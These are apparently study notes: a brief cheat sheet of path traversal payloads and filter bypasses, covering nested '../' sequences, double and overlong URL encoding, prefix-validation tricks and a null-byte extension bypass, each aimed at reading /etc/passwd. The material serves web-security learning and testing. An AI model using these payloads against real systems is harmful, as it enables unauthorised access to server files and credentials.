## Simple
- Simply put something like ../../../etc/passwd in parameter to traverse up 

## Absolute path
- Simply put the absolute path like /etc/passwd in parameter

## Stripped traversal sequences (non-recursive)
- If the app strips path traversal sequences NON-recursively, just nest the sequences and the outer traversal sequences should "survive"
- Instead of `../` use `....//` or `..../\` or `....\/` or `....\\`
- Example: `....//....//....//etc/passwd`

## Stripped URL decodes
- Can use non-standard encodings like `..%252f` or `..%c0%af` instead of `../`
- See OWASP Double Encoding (URL encoding twice for bypass)

## Validation of start of path
- Sometimes, only the start of the path is validated and the rest can be manipulated for directory traversal
- Example: `/var/www/images/../../../etc/passwd`

## Null-byte bypass
- Sometimes an app expects a certain file extension like `.png`, but this can be escaped using the null byte `%00` just before the extension starts
- Example: `../../../etc/passwd%00.jpg`